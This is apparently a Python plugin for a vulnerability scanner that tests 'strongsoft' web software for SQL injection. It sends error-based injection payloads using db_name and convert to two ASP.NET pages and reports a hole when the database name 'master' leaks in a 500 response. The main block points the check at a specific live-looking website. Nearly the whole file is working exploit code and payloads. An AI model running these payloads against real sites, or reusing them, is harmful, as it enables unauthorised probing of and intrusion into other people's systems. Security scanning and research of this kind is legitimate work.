#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:Smeet
#refer:http://www.wooyun.org/bugs/wooyun-2010-091242,http://www.wooyun.org/bugs/wooyun-2010-091284


def assign(service, arg):
    if service == "strongsoft":
        return True, arg 	

def audit(arg):
    payload1 = 'Disaster/ReportCount.aspx?tabnm=1'
    payload2 = 'Disaster/OutGBExcel.aspx?tabnm=a&qtype=b&queryvalue=1'
    getdata1 = '%27%2b(select+1+where+1=convert(int,db_name(1)))%2b%27'
    getdata2 = "%27%2b(select+db_name(1))%2b%27"
    url = arg + payload1 + getdata1
    code, head, res, errcode, _url = curl.curl2(url)
    if code == 500 and 'master' in res:
        security_hole(url + "   :found sql Injection")
    url = arg + payload2 + getdata2
    code, head, res, errcode, _url = curl.curl2(url)
    if code == 500 and 'master' in res:
        security_hole(url + "   :found sql Injection")
			
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('strongsoft', 'http://www.wcfxb.net/')[1])